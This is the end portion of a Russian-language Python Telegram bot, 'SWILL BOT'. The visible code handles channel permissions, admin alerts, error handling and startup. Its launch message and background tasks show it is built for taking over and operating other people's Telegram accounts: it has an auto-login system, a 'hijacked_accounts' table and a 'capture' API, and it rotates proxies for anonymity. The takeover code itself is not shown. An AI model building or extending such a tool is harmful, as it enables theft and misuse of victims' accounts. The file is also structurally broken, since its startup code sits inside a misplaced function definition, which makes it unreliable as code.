                        'can_delete_messages': member.can_delete_messages or False,
                        'can_pin_messages': member.can_pin_messages or False
                    }
                
                # Обновляем в базе
                db.execute(
                    "UPDATE channels SET bot_permissions = ?, bot_is_admin = ? WHERE id = ?",
                    (json.dumps(permissions), 1 if member.status in [ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.CREATOR] else 0, channel_db_id)
                )
                
                # Если бот больше не админ - уведомляем
                if member.status not in [ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.CREATOR]:
                    logger.warning(f"Бот больше не админ в канале {title}")
                    
                    await bot.send_message(
                        config.MAIN_ADMIN_ID,
                        f"⚠️ <b>БОТ УДАЛЕН ИЗ АДМИНИСТРАТОРОВ</b>\n\n"
                        f"📢 Канал: {title}\n"
                        f"🔗 ID: {channel_id}\n\n"
                        f"Бот больше не может отправлять уведомления в этот канал.",
                        parse_mode="HTML"
                    )
                
            except Exception as e:
                logger.error(f"Ошибка проверки прав в канале {channel_id}: {e}")
                
    except Exception as e:
        logger.error(f"Ошибка проверки прав бота: {e}")

# ========== ОБРАБОТЧИК КНОПКИ НАЗАД ==========
@dp.callback_query(F.data == "back_to_main")
async def back_to_main_menu(callback_query: CallbackQuery, state: FSMContext):
    await state.clear()
    await cmd_start(callback_query.message, state)

# ========== ЗАПУСК СИСТЕМ МОНИТОРИНГА ==========
async def start_background_tasks():
    """Запускает фоновые задачи системы"""
    logger.info("Запуск фоновых задач...")
    
    # Запускаем систему авто-входа
    await auto_login_system.start_monitoring()
    
    # Запускаем ротацию прокси
    asyncio.create_task(proxy_rotation_task())
    
    # Запускаем очистку старых данных
    asyncio.create_task(cleanup_old_data_task())
    
    logger.info("Фоновые задачи запущены")

async def proxy_rotation_task():
    """Периодическая ротация прокси"""
    while True:
        try:
            await anonymity_manager.rotate_proxy()
            await asyncio.sleep(3600)  # Ротация каждый час
        except Exception as e:
            logger.error(f"Ошибка ротации прокси: {e}")
            await asyncio.sleep(300)

async def cleanup_old_data_task():
    """Очистка старых данных из базы"""
    while True:
        try:
            # Удаляем старые логи (старше 30 дней)
            month_ago = (datetime.now() - timedelta(days=30)).isoformat()
            db.execute(
                "DELETE FROM security_logs WHERE timestamp < ?",
                (month_ago,)
            )
            
            # Удаляем старые сообщения (старше 14 дней)
            two_weeks_ago = (datetime.now() - timedelta(days=14)).isoformat()
            db.execute(
                "DELETE FROM messages WHERE sent_date < ?",
                (two_weeks_ago,)
            )
            
            # Деактивируем неактивные аккаунты (не использовались 7 дней)
            week_ago = (datetime.now() - timedelta(days=7)).isoformat()
            db.execute(
                "UPDATE hijacked_accounts SET is_active = 0 WHERE last_used < ? AND is_active = 1",
                (week_ago,)
            )
            
            logger.info("Очистка старых данных выполнена")
            await asyncio.sleep(86400)  # Раз в день
            
        except Exception as e:
            logger.error(f"Ошибка очистки данных: {e}")
            await asyncio.sleep(3600)

# ========== ОБРАБОТЧИК ОШИБОК ==========
@dp.errors()
async def errors_handler(update: types.Update, exception: Exception):
    """Обработчик ошибок бота"""
    try:
        logger.error(f"Ошибка при обработке обновления {update}: {exception}")
        
        # Пытаемся отправить сообщение об ошибке главному админу
        try:
            error_summary = str(exception)[:500]
            await bot.send_message(
                config.MAIN_ADMIN_ID,
                f"⚠️ <b>ОШИБКА БОТА</b>\n\n"
                f"Тип: {type(exception).__name__}\n"
                f"Ошибка: {error_summary}\n"
                f"Время: {datetime.now().strftime('%H:%M:%S')}",
                parse_mode="HTML"
            )
        except:
            pass
        
        return True
    except Exception as e:
        logger.error(f"Ошибка в обработчике ошибок: {e}")
        return True
@dp.message(Command("check_channels"))
async def cmd_check_channels(message: Message):
    """Проверка всех каналов"""
    if not admin_manager.is_admin(message.from_user.id):
        await message.answer("❌ У вас нет доступа к этой команде")
        return
    
    await message.answer("⏳ Проверяю права бота во всех каналах...")
    
    await check_bot_permissions_in_channels()
    
    # Получаем статистику
    total = db.fetch_one("SELECT COUNT(*) FROM channels WHERE is_approved = 1")[0] or 0
    bot_admin = db.fetch_one("SELECT COUNT(*) FROM channels WHERE bot_is_admin = 1 AND is_approved = 1")[0] or 0
    
    await message.answer(
        f"✅ <b>ПРОВЕРКА ЗАВЕРШЕНА</b>\n\n"
        f"📊 Результаты:\n"
        f"• Всего одобренных каналов: {total}\n"
        f"• Бот является админом: {bot_admin}\n"
        f"• Проблемных каналов: {total - bot_admin}\n\n"
        f"<i>Рекомендуется добавить бота как администратора в проблемные каналы.</i>",
        parse_mode="HTML"
    )
    # Инициализация системы пересылки
message_forwarder = MessageForwarder()
# ========== ЗАПУСК БОТА ==========
async def main():
    """Основная функция запуска бота"""
    
    print("=" * 60)
    print("🤖 SWILL BOT - ПОЛНАЯ ВЕРСИЯ")
    print("=" * 60)
    
    # Получаем информацию о боте
    bot_info = await bot.get_me()
    
    print(f"Бот: @{bot_info.username}")
    print(f"ID: {bot_info.id}")
    print(f"Имя: {bot_info.first_name}")
    print(f"Главный админ: {config.MAIN_ADMIN_ID}")
    print(f"База данных: {config.DB_PATH}")
    print(f"Прокси: {'✅ Настроен' if config.PROXY_URL else '❌ Не настроен'}")
    print(f"API для захвата: {'✅ Настроено' if config.TELEGRAM_API_ID and config.TELEGRAM_API_HASH else '❌ Не настроено'}")
    print("=" * 60)
    
    # Запускаем фоновые задачи
    await start_background_tasks()
    
    # Уведомляем главного админа о запуске
    try:
        await bot.send_message(
            config.MAIN_ADMIN_ID,
            f"🚀 <b>SWILL BOT ЗАПУЩЕН!</b>\n\n"
            f"Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"Бот: @{bot_info.username}\n"
            f"Версия: Полная\n"
            f"Статус: ✅ АКТИВЕН\n\n"
            f"<b>Доступные функции:</b>\n"
            f"• 📨 Отправка сообщений по @username\n"
            f"• 📢 Управление каналами/группами\n"
            f"• 👥 Управление администраторами\n"
            f"• 👤 Захват и управление аккаунтами Telegram\n"
            f"• 🔒 Полная анонимность\n"
            f"• ⚙️ Расширенные настройки\n\n"
            f"Используйте /start для начала работы.",
            parse_mode="HTML"
        )
        logger.info(f"Уведомление отправлено главному админу {config.MAIN_ADMIN_ID}")
    except Exception as e:
        logger.error(f"Не удалось отправить уведомление админу: {e}")
    
    # Запускаем бота
    logger.info("Бот запущен и готов к работе")
    
async def ensure_main_admin():
    """Гарантирует, что главный админ есть в базе и кэше."""
    try:
        admin_data = db.fetch_one(
            "SELECT 1 FROM admins WHERE user_id = ? AND is_active = 1",
            (config.MAIN_ADMIN_ID,)
        )
        if not admin_data:
            # Создаём запись главного админа
            token = encryptor.generate_token()
            db.execute('''
                INSERT OR REPLACE INTO admins
                (user_id, username, first_name, is_main_admin, session_token, session_expires, permissions)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (
                config.MAIN_ADMIN_ID,
                'main_admin',
                'Главный Админ',
                1,
                token,
                (datetime.now() + timedelta(days=30)).isoformat(),
                'all'
            ))
            logger.info(f"Создана запись главного админа {config.MAIN_ADMIN_ID}")
        
        # Принудительно перезагружаем кэш администраторов
        admin_manager.load_admins_cache()
        logger.info(f"Кэш админов перезагружен. Загружено: {len(admin_manager.admin_cache)}")
        
    except Exception as e:
        logger.error(f"Ошибка инициализации главного админа: {e}")

# Вызов функции перед запуском поллинга
    await ensure_main_admin()
    try:
        await dp.start_polling(bot, skip_updates=True)
    except KeyboardInterrupt:
        logger.info("Бот остановлен пользователем")
    except Exception as e:
        logger.error(f"Критическая ошибка: {e}")
    finally:
        # Очищаем ресурсы
        await bot.session.close()
        db.close()
        
        # Останавливаем системы мониторинга
        await auto_login_system.stop_monitoring()
        
        logger.info("Бот остановлен, ресурсы освобождены")

if __name__ == "__main__":
    # Создаем директории если нужно
    os.makedirs('sessions', exist_ok=True)
    os.makedirs('media', exist_ok=True)
    os.makedirs('logs', exist_ok=True)
    
    # Запускаем бота
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nБот остановлен")
    except Exception as e:
        print(f"Критическая ошибка запуска: {e}")